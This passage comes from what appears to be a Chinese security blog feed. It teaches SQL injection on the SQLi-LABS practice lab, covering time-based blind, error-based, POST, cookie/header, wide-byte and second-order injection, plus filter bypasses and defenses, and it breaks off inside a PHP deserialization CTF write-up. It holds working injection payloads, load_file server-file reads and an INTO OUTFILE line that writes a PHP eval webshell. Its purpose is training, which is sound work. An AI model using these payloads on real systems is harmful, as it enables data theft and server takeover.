class="line-numbers-rows"><span></span></span></code></pre><ul><li>……                                                              (接下来可照此法判断列名以及列中数据。)</li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当页面没有回回显内容时，即使输入错误的SQL语句页面也不会发生变化。此时我们应该考虑另外一种注入方式。即基于时间的延时盲注。</p><p>SQL语句与布尔盲注大致相同，所不同的是布尔条件以及无法使我们获得所需要的信息，因此我们引入了一个新的函数:</p><ul><li>sleep()                                                            //延时</li></ul><p>我们以SQLi-LABS-less9为例，相同的知识不再赘述直接输入以下语句。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(5) --+&#x2F;&#x2F;若条件为真则延时5秒<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到图示处出现了延时</p><p><img src="https://img-blog.csdnimg.cn/2021020415364245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>判断数据库长度：如果数据库长度为8则延迟5秒否则立即响应</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153652563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>可参考结合布尔盲注的SQL语句进行下一步查询，这里不再赘述。</strong></li></ul><h2 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h2><p>在联合查询中，我们根据报错信息来获取注入类型是整型还是字符型。接下来，我们要利用报错信息来获取一些更敏感的信息。（这里适用于页面没有显示位，但页面会有报错信息的显示）</p><h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><pre><code>EXTRACTVALUE (XML_document, XPath_string)</code></pre><ul><li><p>extractvalue()    //从目标xml中返回包含所查询的字符串</p></li><li><p>XML_document是strings格式，为 XML 文档对象的名称</p></li><li><p>XPath_string (Xpath 格式的字符串)</p></li></ul><p>我们依然用SQLi-LABS-less5进行演示：</p><ul><li><p>extractvalue的第一个参数我们任意写一个文档名称1；因为第二个参数须为Xpath格式字符串，我们写的</p><p>database()显然不符合要求，因此会产生报错。而我们就是利用这个报错点去寻找我们需要的敏感信息。</p><p>我们用concat连接‘~’与database()值。（Xpath语法如果想要深入了解可自行百度。）</p></li><li><p>暴数据库</p></li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153740297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>暴表名</li></ul><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415375090.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>……</li></ul><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><pre><code>UPDATEXML (XML_document, XPath_string, new_value)</code></pre><ul><li>updatexml()            //更新xml文档</li><li>XML_document 是strings格式，为 xml文档对象的名称</li><li>XPath_string (Xpath 格式的字符串)</li><li>new_value，String 格式，替换查找到的符合条件的数据</li></ul><p>使用方法与extractvalue报错注入类似。区别为updatexml有<strong>三个参数</strong>。如下语句：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;IP&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、POST注入"><a href="#4、POST注入" class="headerlink" title="4、POST注入"></a>4、POST注入</h2><h3 id="使用工具burpsuie进行重放"><a href="#使用工具burpsuie进行重放" class="headerlink" title="使用工具burpsuie进行重放"></a>使用工具burpsuie进行重放</h3><p>在GET注入中，我们可以直接在url的参数中修改我们的内容。在POST注入中，我们该如何放置我们的SQL语句呢？</p><p>我们以SQLi-LABS-less11进行演示：</p><p><img src="https://img-blog.csdnimg.cn/2021020415381535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到显示在我们面前的是一个登录框，不管我们输入什么，url都不会有任何变化。因此在url中注入我们的SQL语句是无效的。此时，我们可以利用burpsuite进行抓包。（不了解burpsuite的可以学习一下他的简单用法。）</p><ul><li>我们在登录框分别输入user;password进行抓包，并发送到Repeater模块重放入下图所示：</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204153824963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们在user后加单引号，点击Go可以看到页面发生了报错</li></ul><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;user&#39;&amp;passwd&#x3D;password&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153836589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>接着我们在user’ 后添加# 注释掉后边的内容可以看到页面恢复了正常。</li></ul><pre class="line-numbers language-none"><code class="language-none">uname&#x3D;user&#39; #&amp;passwd&#x3D;password&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204153852704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>由此我们可以在此处进行我们的SQL语句构造。<strong>（所需要测试的步骤可参考上文，仅是注入的地方从原来的url改为图上所示位置。</strong></li></ul><h3 id="使用hackbar插件进行注入"><a href="#使用hackbar插件进行注入" class="headerlink" title="使用hackbar插件进行注入"></a>使用hackbar插件进行注入</h3><p>若我们知道提交的变量是什么，可直接使用hackbar插件进行POST注入。（此种方法比较局限）</p><p><img src="https://img-blog.csdnimg.cn/20210204153902822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5、Cookie注入、Http-referer注入、User-Agent注入"><a href="#5、Cookie注入、Http-referer注入、User-Agent注入" class="headerlink" title="5、Cookie注入、Http-referer注入、User-Agent注入"></a>5、Cookie注入、Http-referer注入、User-Agent注入</h2><p>SQL注入作为一种很常见的攻击方式被越来越多的人所知晓。且绝大多数开发人员在开发过程中会对用户传入的参数进行适当的过滤，如添加黑名单，对GET，POST方式提交的数据进行了参数过滤。然而对通过Cookie方式提交的数据却并没有过滤。而Cookie注入说就是利用Cookie而发起的注入攻击。从本质上来讲，Cookie注入与传统的SQL注入并无不同，两者都是针对数据库的注入，只是表现形式上略有不同罢了。</p><p>例如：SQLi-LABS-less20；账号密码均为admin 进行登陆。</p><p><img src="https://img-blog.csdnimg.cn/20210204153932108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210204153943461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用burpsuite进行抓包并发送至repeater模块，我们看到cookie参数：Cookie: uname=admin</p><p><img src="https://img-blog.csdnimg.cn/20210204153957840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接下来我们在此处进行常规的SQL注入即可。</p><ul><li>如：查看字段数</li></ul><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;admin&#39; order by 3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204154011857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>查看版本信息及数据库</li></ul><pre class="line-numbers language-none"><code class="language-none">Cookie: uname&#x3D;admin&#39; and 1&#x3D;2 union select database(),version(),3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2021020415402649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>……</li></ul><p><strong>Http-referer</strong>注入、<strong>User-Agent</strong>注入与<strong>Cookie</strong>注入大体类似，抓包后在不同地点注入即可。</p><h2 id="6、SQL注入读写文件"><a href="#6、SQL注入读写文件" class="headerlink" title="6、SQL注入读写文件"></a>6、SQL注入读写文件</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code>我们可以利用通过SQL语法读取服务器上的一些特定的文件。如一些配置文件来获取数据库用户名密码，或者一些源码    等。利用函数：</code></pre><ul><li>load_file(file_name)                    //读取文件并返回该文件的内容作为一个字符串。</li></ul><p><strong>前提条件：</strong></p><ul><li><p>须有读取权限，且文件完全可读            <em><strong>在本地环境搭建测试时,mysql全局变量的配置中secure_file_priv 的值不能是null</strong></em>    </p>   <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">secure_file_priv &#x3D; 空的时候 ，任意读写secure_file_priv &#x3D; 某个路径的时候，只能在规定的那个路径下读写secure_file_priv &#x3D; null 不能读写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>要知道读写<strong>绝对</strong>路径</p></li></ul><pre class="line-numbers language-none"><code class="language-none">以SQLi-LABS-less1为例：http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+我们可以直接在显示位上注入我们的SQL命令。如：http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,load_file(&quot;绝对路径&quot;),3 --+绝对路径的获取方法：1、经验；2、根据一些报错信息中获取。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><ul><li><p>into outfile</p><p>  以SQLi-LABS-less1为例：</p></li></ul><pre class="line-numbers language-none"><code class="language-none">#http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+#我们可以利用into outfile将一句话木马写入到某个路径http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,&quot;&lt;?php@eval($_GET[&#39;test&#39;]);?&gt;&quot; into outfile &#39;绝对路径&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、宽字节注入"><a href="#7、宽字节注入" class="headerlink" title="7、宽字节注入"></a>7、宽字节注入</h2><p>前置知识</p><ul><li>GBK编码方式用两个字节表示一个字符</li><li>ASCII                   一个字节表示一个字符</li><li>MYSQL数据库默认字符集是GBK等宽字节字符集。（宽字节字符集还有GB2312、GB18030、BIG5等）</li><li>PHP中编码为GBK，函数执行添加的是ASCII编码。</li><li>addslashes()                //函数返回在预定义字符之前添加反斜杠 \ 的字符串。</li></ul><p>那么什么是宽字节注入呢？下面我们直接用实例来讲解：</p><p>下面以SQLi-LABS-less32为例</p><p><img src="https://img-blog.csdnimg.cn/20210204154057285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们按照正常的SQL注入流程，首先添加单引号，看页面是否发生变化。</li></ul><p><img src="https://img-blog.csdnimg.cn/2021020415410783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们看到页面没有发生变化，然而仔细观察下面的提示信息后，我们发现在我们的 <strong>1’</strong> 中件被自动添加了一个 <strong>反斜杠</strong> ,即**1\‘**。    显然我们输入的单引号被转义了。我们都知道被转义后的单引号它仅仅是个只能显示符号（像花瓶儿一样，除了观赏之外他无法再发挥任何作用）。所以我们想绕过这个转义，就必须把 ‘*<em>\*</em>‘ 去掉。</li></ul><p>由此引入我们的宽字节：</p><ul><li>反斜杠在十六进制中为**%5C<strong>， 那么</strong>1\‘  =  **<strong>1%5C%27</strong>.</li><li>我们可以在反斜杠前加%df，即  1%df%5C%27  </li><li>如果程序的默认字符集是GBK等宽字节字符集，MySQL使用的编码也是GBK时。认为 <strong>%df%5c</strong>是一个<strong>宽字符</strong>，也就是<strong>縗</strong>。也就是说：<code>1%df\&#39;</code>= <code>1%df%5c%27</code>=<code>1縗’</code>，有了单引号就好注入了。</li></ul><p>如下图所示：</p><p><code>http://IP/Less-32/?id=1%df&#39; --+</code></p><p><img src="https://img-blog.csdnimg.cn/2021020415411967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>附：GBK编码范围：8140－FEFE</p><h2 id="8、二次注入"><a href="#8、二次注入" class="headerlink" title="8、二次注入"></a>8、二次注入</h2><p>所谓二次注入：</p><p>攻击者<strong>构造</strong>的恶意数据在<strong>存储</strong>在数据库之后，恶意数据被数据库服务器误认为是正常的数据进行<strong>引用</strong>，从而进入到SQL查询语句中运行而导致的注入。</p><p>例：在前文宽字节注入中我们提到过的一个函数： <strong>addslashes()</strong></p><p>假使我们注入的参数为<code>1&#39;</code>,经过<strong>addslashes</strong>转义后变为了<code>1\&#39;</code>。  然而<strong>addslashes</strong>虽然对<code>&#39;</code>进行了<code>\</code>转义,但是<code>\</code>并不会插入到数据库中，在写入数据库时仍为<code>1&#39;</code>,这样，我们在下一次调用这个参数的时候，<code>&#39;</code>不会被转义，从而触发了    SQL注入。由此便形成了<strong>二次注入</strong>。</p><p>我们以SQLi-LABS-less24为例（为了更直观此处环境为本地搭建）</p><ul><li>我们进行常规的SQL注入。（显然是失败的）</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154144946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210204154158300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们在查看源代码发现在登陆处的username和password都经过了<strong>mysql_real_escape_string</strong>函数的转义</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154232900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>返回登陆页我们看到New User click here? 点击，不妨注册一下。（账号：admin’# 密码：123456）如下图：</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154257435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>注册成功后我们查看一下数据库，可以看到转义符号<code>\</code>并没有被存储在数据库中。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154307196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>当我们用注册的账号密码（admin’# ; 123456）登陆后，出现一个修改密码的界面。我们进行修改密码：新密码为：qweasd</p><p>  <img src="https://img-blog.csdnimg.cn/20210204154316670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><ul><li><p>密码修改后我们直接看看数据库，看看有什么变化？</p></li><li><p>可以看到<code>admin&#39;#</code>密码似乎并没有发生变化，而管理员账号admin 变成了我们输入的新密码。（这样我们直接修改了管理员的密码）那么为什么会这样呢？？？</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210204154325658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>我们查看一下密码修改的源代码</li></ul><p><img src="https://img-blog.csdnimg.cn/2021020415434595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>SQL语句是这样的</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>而实际执行的语句是这样的：</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='qweasd' where username='admin'#' and password='$curr_pass' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210204154402812.png" alt="在这里插入图片描述"></p><ul><li>当我们提交用户名 <code>admin&#39;#</code> 修改密码为 qweasd的时候，<code>#</code>把后面的都给注释了，所以就是修改了admin用户的密码为 qweasd。</li></ul><h2 id="SQL注入过滤与绕过"><a href="#SQL注入过滤与绕过" class="headerlink" title="SQL注入过滤与绕过"></a>SQL注入过滤与绕过</h2><p>过滤，顾名思义，将一些敏感字符过滤掉，从而达到一个防止注入的目的。</p><p>绕过，使用某种方法来绕过过滤的内容，从而达到继续注入的目的。</p><p>此处介绍几种常见的绕过方式，这些方法不局限于SQL注入，在其它web安全漏洞进行绕过时也可作为思路进行发散。</p><h3 id="1、大小写绕过"><a href="#1、大小写绕过" class="headerlink" title="1、大小写绕过"></a>1、大小写绕过</h3><p>若程序只是设置了关键字过滤，（发现关键字的出现就把他过滤掉而不是对他的深层含义进行解析过滤）由于数据库的查询语句对大小写并不敏感，我们可以使用大小写字母转换来进行绕过。例如：select 可用SeLeCt代替。</p><h3 id="2、双写绕过"><a href="#2、双写绕过" class="headerlink" title="2、双写绕过"></a>2、双写绕过</h3><p>若程序设置了关键字过滤为空。</p><p>例： <code>union -&gt;空</code>   我们可以使用双写进行过滤 <code>uniunionon  -&gt;  uni空on  -&gt;  union</code>            (<strong>注意</strong>：这里的<strong>空</strong>仅是为了看起来直观一些，指的是什么都没有，不是字符空)</p><h3 id="3、编码绕过"><a href="#3、编码绕过" class="headerlink" title="3、编码绕过"></a>3、编码绕过</h3><p>可尝试使用url十六进制加密进行绕过 </p><p><code>or -&gt; %6f%72</code></p><p>ASCII码转字符进行绕过</p><p><code>user -&gt;  char(117)+char(115)+char(101)+char(114)</code></p><h3 id="4、内联注释绕过"><a href="#4、内联注释绕过" class="headerlink" title="4、内联注释绕过"></a>4、内联注释绕过</h3><p>在Mysql中，内联注释中的内容可以被当作SQL语句执行。<code>/*! */</code></p><p>例：<code>select * from admin  -&gt; /*!select*/ * from admin</code></p><h2 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h2><h3 id="1、严格分配权限"><a href="#1、严格分配权限" class="headerlink" title="1、严格分配权限"></a>1、严格分配权限</h3><p>对于非管理员用户的要禁止其对数据库的操作权限。</p><h3 id="2、黑白名单"><a href="#2、黑白名单" class="headerlink" title="2、黑白名单"></a>2、黑白名单</h3><p>使用黑名单禁止一些敏感数据的出现，如使用正则表达式过滤传入的参数。</p><p>使用白名单来规范用户的输入，严格限定参数类型和格式。如手机号输入：仅允许用户输入0-9的数字且只能是11位。</p><h3 id="3、严格控制输出。"><a href="#3、严格控制输出。" class="headerlink" title="3、严格控制输出。"></a>3、严格控制输出。</h3><p>对于一些错误的操作，只告诉用户对或者是错，尽量避免一些敏感信息出现在报错信息中。</p><h3 id="4、预编译防止SQL注入"><a href="#4、预编译防止SQL注入" class="headerlink" title="4、预编译防止SQL注入"></a>4、预编译防止SQL注入</h3><p>将SQL语句在程序运行前已经进行预编译，那么接下来用户不论输入什么都不会影响到SQL语句的执行，由此SQL语句预编译可以有效防御SQL注入。</p><h3 id="5、使用安全设备"><a href="#5、使用安全设备" class="headerlink" title="5、使用安全设备"></a>5、使用安全设备</h3><p>如WAF、数据库云审计、云防护、IPS等。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2022/01/15/php-fan-xu-lie-hua/"/>
      <url>/2022/01/15/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p><strong>为什么要进行序列化</strong></p><p>当对一个变量赋值后，在本次程序运行完成后，变量会从内存中清除掉。而<strong>序列化</strong>的目的时把变量保存在硬盘中，用到时可方便的通过<strong>反序列化</strong>把之前序列化的内容变回可用变量。即序列化用于在存储或传递PHP的值的过程中，同时不丢失其类型和结构。利于对象的<strong>保存</strong>和<strong>传输</strong>。<br><img src="https://img-blog.csdnimg.cn/20210429223736297.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h2><table><thead><tr><th>序列化</th><th>反序列化</th></tr></thead><tbody><tr><td>对象转换为字符串</td><td>特定格式的字符串转换为对象</td></tr><tr><td>函数：serialize()</td><td>函数：unseriasize()</td></tr></tbody></table><p><strong>serialize():</strong></p><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p><p>eg:<br><img src="https://img-blog.csdnimg.cn/20210429223801901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>unserialize():</strong></p><p>与 serialize() 对应，unserialize()用于将serialize() 函数序列化后的对象或数组进行反序列化，并返回原始对象结构。</p><p><img src="https://img-blog.csdnimg.cn/20210429223824617.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>如果传递的字符串不可反序列化，则返回 FALSE，并产生一个E_NOTICE。</p><p><img src="https://img-blog.csdnimg.cn/20210429223936636.jpg" alt="在这里插入图片描述"></p><p><strong>字符串结构解释</strong></p><p><strong>a:4:{s:4:”name”;s:4:”twds”;s:3:”age”;s:2:”22”;s:3:”sex”;s:3:”男”;s:5:”phone”;s:6:”123456”;}</strong></p><ul><li>a-&gt;array</li><li>s-&gt;strings</li><li>a:4-&gt;代表集合中有4个元素</li><li>s:4:’name’-&gt;类型 为string:变量长度为4个字节:变量名为name。（之后同理）</li></ul><h2 id="PHP中的魔术方法"><a href="#PHP中的魔术方法" class="headerlink" title="PHP中的魔术方法"></a>PHP中的魔术方法</h2><p><strong>PHP中把以两个下划线__开头的方法称为魔术方法</strong></p><table><thead><tr><th>常见php魔术方法</th><th></th></tr></thead><tbody><tr><td>__construct()</td><td>类的构造函数，当一个对象创建时被调用</td></tr><tr><td>__destruct()</td><td>类的析构函数，当一个对象销毁时被调用</td></tr><tr><td>__wakeup()</td><td>执行unserialize()时会先调用这个函数</td></tr><tr><td>__sleep()</td><td>执行serialize()时会先调用这个函数</td></tr><tr><td>__toString()</td><td>类被当成字符串时的被调用</td></tr><tr><td>__isset()</td><td>在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td>__unset()</td><td>在不可访问的属性上使用unset()时触发</td></tr><tr><td>__get()</td><td>用于从不可访问的属性读取数据</td></tr><tr><td>__set()</td><td>用于将数据写入不可访问的属性</td></tr><tr><td>__call()</td><td>在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><p><strong>产生反序列化的原因：</strong></p><p>根本原因：是程序没有对用户输入的反序列化字符串进行检测，导致<strong>反序列化过程</strong>可以被<strong>用户</strong>恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p><p><strong>漏洞产生条件：</strong></p><ul><li>unserialize()函数的参数可控</li><li>php中有可以利用的类并且类中有魔术方法</li></ul><h2 id="CTF真题"><a href="#CTF真题" class="headerlink" title="CTF真题"></a>CTF真题</h2><p><strong>2020-网鼎杯-青龙组-Web-AreUSerialz</strong></p><p>题目源码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token 